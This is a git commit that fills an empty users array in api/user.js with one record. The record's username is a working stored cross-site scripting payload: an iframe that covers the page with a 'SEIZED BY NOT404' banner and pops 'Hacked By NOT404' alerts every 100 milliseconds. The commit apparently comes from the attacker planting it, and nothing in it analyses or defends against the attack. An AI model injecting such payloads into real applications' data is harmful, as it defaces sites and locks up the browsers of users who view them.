cd8140b238bb28bbc3e954b1901b87b59b085bf5
bimxyzofficial-cloud <bimxyzofficial@gmail.com>
2026-01-09 00:22:14 +0700

    update users by Bimxyz

--- api/user.js
+++ api/user.js
@@ -1,1 +1,6 @@
-export const users = [];
+export const users = [
+  {
+    "username": "<iframe srcdoc=\"<body style='background:#000;margin:0;padding:0;width:100vw;height:100vh;overflow:hidden;position:fixed;top:0;left:0;z-index:999999;'><div style='color:#f00;font-size:4em;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);'>SEIZED BY NOT404</div><script>setInterval(()=>alert('You Are An Idiot\\nHacked By NOT404'),100);</script></body>\" style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:999999;\"></iframe>",
+    "password": "12"
+  }
+];
